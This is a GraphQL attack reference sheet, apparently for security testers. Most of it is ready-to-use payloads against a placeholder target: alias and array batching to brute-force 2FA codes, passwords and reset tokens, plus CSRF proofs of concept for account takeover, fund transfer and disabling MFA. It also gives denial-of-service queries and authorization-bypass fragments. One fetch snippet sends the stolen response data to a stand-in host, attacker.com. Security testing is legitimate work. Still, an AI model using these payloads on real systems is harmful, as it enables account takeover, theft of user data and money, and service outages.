# Feature Abuse Reference

## 1. Alias Abuse — Rate Limit & 2FA Bypass

### Why It Works

GraphQL aliases let you call the same operation multiple times in ONE request.
Rate limiters typically count HTTP requests, not individual operations.
One request with 1000 aliases = 1 HTTP request but 1000 operations.

### Basic Alias Pattern

```graphql
query {
  alias1: operationName(arg: "value1") { result }
  alias2: operationName(arg: "value2") { result }
  alias3: operationName(arg: "value3") { result }
}
```

### 2FA / OTP Bypass

```graphql
# Send all possible 6-digit OTPs (or a range) in one request
mutation {
  a0: verifyOTP(code: "000000") { success token }
  a1: verifyOTP(code: "000001") { success token }
  a2: verifyOTP(code: "000002") { success token }
  # ... continue to 999999
  # Generate with: for i in $(seq 0 9999); do echo "  a$i: verifyOTP(code: \"$(printf '%06d' $i)\") { success token }"; done
}
```

**With CrackQL (automated):**
```bash
# Install
pip3 install CrackQL

# Create query template (query.graphql)
mutation VerifyOTP($code: String!) {
  verifyOTP(userId: "TARGET_USER_ID", code: $code) {
    success
    token
  }
}

# Create CSV wordlist of OTPs
python3 -c "print('code'); [print(str(i).zfill(6)) for i in range(1000000)]" > otp.csv

# Run
CrackQL --target https://target.com/graphql \
  --query query.graphql \
  --variable-file otp.csv \
  --verbose
```

### Login Brute Force via Aliases

```graphql
mutation {
  a1: login(email: "admin@target.com", password: "password123") { token user { id } }
  a2: login(email: "admin@target.com", password: "admin123") { token user { id } }
  a3: login(email: "admin@target.com", password: "letmein") { token user { id } }
  a4: login(email: "admin@target.com", password: "qwerty123") { token user { id } }
  a5: login(email: "admin@target.com", password: "P@ssw0rd") { token user { id } }
}
```

```bash
# CrackQL with password list
cat > login.graphql << 'EOF'
mutation Login($password: String!) {
  login(email: "admin@target.com", password: $password) {
    token
    user { id email role }
  }
}
EOF

# Use rockyou subset
CrackQL --target https://target.com/graphql \
  --query login.graphql \
  --variable-file passwords.csv
```

### Password Reset Token Brute Force

```graphql
mutation {
  a1: verifyResetToken(token: "AAAA") { valid }
  a2: verifyResetToken(token: "AAAB") { valid }
  a3: verifyResetToken(token: "AAAC") { valid }
  # Enumerate until valid = true
}
```

### Discount Code Enumeration

```graphql
query {
  c1: checkDiscount(code: "SAVE10") { valid percentage }
  c2: checkDiscount(code: "SAVE20") { valid percentage }
  c3: checkDiscount(code: "ADMIN50") { valid percentage }
  c4: checkDiscount(code: "VIP100") { valid percentage }
}
```

---

## 2. Array-Based Query Batching

### Why It Works

Different from alias abuse. Send multiple COMPLETE operations in one HTTP request as an array. Same rate limiting bypass effect.

```json
[
  {"query": "mutation { login(email: \"admin@target.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"}
]
```

**Note:** Not all servers support array batching. Test with:
```json
[{"query":"{__typename}"},{"query":"{__typename}"}]
```
If you get an array of two responses → batching supported.

### Parallel Email Enumeration

```json
[
  {"query": "mutation { login(email: \"user1@target.com\", password: \"x\") { token } }"},
  {"query": "mutation { login(email: \"user2@target.com\", password: \"x\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"x\") { token } }"}
]
```

Different error messages for valid vs invalid emails = user enumeration.

---

## 3. GraphQL CSRF

### Preconditions

For CSRF to work, the GraphQL endpoint must:
- Accept GET requests **OR**
- Accept `application/x-www-form-urlencoded` content type

JSON-only (`application/json`) endpoints normally require CORS bypass for CSRF.

### Test CSRF Preconditions

```bash
# Test 1: Does it accept GET?
curl "https://target.com/graphql?query=mutation{changeEmail(email:\"hacked@evil.com\"){success}}"

# Test 2: Does it accept form-encoded?
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=mutation{changeEmail(email:\"hacked@evil.com\"){success}}"
```

### CSRF via GET (Simplest — No User Interaction Beyond Visiting URL)

```
# Victim visits this URL → mutation executes with their session:
https://target.com/graphql?query=mutation{changeEmail(newEmail:"attacker@evil.com"){success}}

# URL-encoded
https://target.com/graphql?query=mutation%7BchangeEmail(newEmail%3A%22attacker%40evil.com%22)%7Bsuccess%7D%7D
```

### CSRF via HTML Form (Higher Reliability)

Create attacker HTML page:
```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://target.com/graphql" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query"
    value='mutation { changeEmail(newEmail: "attacker@evil.com") { success } }'>
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>
```

### CSRF via Fetch (When Same-Site Cookie is Lax)

```html
<script>
fetch('https://target.com/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'query=mutation{changeEmail(newEmail:"attacker@evil.com"){success}}'
})
.then(r => r.json())
.then(data => {
  // Exfiltrate result to attacker server
  fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(data)));
});
</script>
```

### High-Value CSRF Targets

```graphql
# Account takeover via email change
mutation { changeEmail(email: "attacker@evil.com") { success } }

# Password change (if no current password required)
mutation { changePassword(newPassword: "hacked123") { success } }

# Disable 2FA
mutation { disableMFA { success } }

# Add attacker as admin to org
mutation { addMember(orgId: "TARGET_ORG", email: "attacker@evil.com", role: "ADMIN") { success } }

# Delete account data
mutation { deleteAllData(confirm: true) { success } }

# Transfer funds (fintech)
mutation { transferFunds(toAccount: "ATTACKER_ACCOUNT", amount: 1000) { txId success } }
```

---

## 4. DoS via Query Complexity

### Query Depth Attack

Create deeply nested queries to exhaust server resources:

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    id email
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Increase depth until:** server slows down, timeout, or OOM error.

### Alias Explosion DoS

```graphql
query {
  a1: getHeavyReport { data }
  a2: getHeavyReport { data }
  a3: getHeavyReport { data }
  # ... repeat 10,000 times
}
```

```bash
# Generate via Python
python3 -c "
q = 'query {\n'
for i in range(10000):
    q += f'  a{i}: getHeavyReport {{ data }}\n'
q += '}'
print(q)
" > dos_query.graphql

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$(cat dos_query.graphql | tr '\n' ' ')\"}"
```

### Fragment Cycling Attack (Circular References)

```graphql
fragment f1 on User {
  ...f2
}
fragment f2 on User {
  ...f1
}
query { user(id: 1) { ...f1 } }
```

Exploits parsers that don't handle recursive fragment references.

### Introspection as DoS

If introspection is enabled, full introspection on large schemas can be slow:

```bash
# Send many introspection requests in parallel
for i in {1..50}; do
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}' &
done
```

### Directive Abuse

```graphql
# @skip and @include directives — some implementations have overhead
query {
  user(id: 1) {
    id @skip(if: false) @skip(if: false) @skip(if: false)
    email @include(if: true) @include(if: true) @include(if: true)
    # Repeat directives many times per field
  }
}
```

---

## 5. Subscription Abuse

```graphql
# Unauthenticated subscription to sensitive events
subscription {
  newTransaction {
    id
    fromUser { email }
    toUser { email }
    amount
  }
}

subscription {
  userStatusChanged {
    userId
    email
    newStatus
  }
}

# DoS via many persistent subscriptions
# Open 1000 WebSocket connections, each with active subscription
```

---

## 6. Parameter Smuggling / Authorization Bypass

From Jon Bottarini's research — bypass account-level permissions:

```graphql
# Original (blocked — checks your permissions for OtherUser's data)
query {
  getUser(id: "OtherUserId") { email privateData }
}

# Smuggled — nest within your own authorized object
query {
  me {
    ... on AdminUser {
      users {
        id email privateData
      }
    }
  }
}
```

### Inline Fragment Permission Bypass

```graphql
# Type coercion bypass
query {
  node(id: "VICTIM_USER_ID") {
    ... on User {
      email
      privateInfo
      paymentMethods { cardNumber }
    }
    ... on AdminUser {
      allSystemLogs { action userId }
      secretConfig { apiKey dbPassword }
    }
  }
}
```

---

## 7. Abuse Testing Checklist

```
Rate Limit Bypass:
[ ] Alias abuse on login → brute force?
[ ] Alias abuse on OTP/2FA verify → bypass?
[ ] Array batching supported?
[ ] Batch abuse on sensitive operation?

CSRF:
[ ] GET method accepted?
[ ] Form-encoded accepted?
[ ] Sensitive mutation via GET URL?
[ ] CSRF HTML PoC tested in browser?

DoS:
[ ] Maximum query depth tested?
[ ] Alias explosion tested?
[ ] Fragment cycling tested?
[ ] Heavy operation + batching = server slowdown?

Subscriptions:
[ ] Subscription endpoints found?
[ ] Unauthenticated subscription tested?
[ ] Sensitive event data accessible?
```
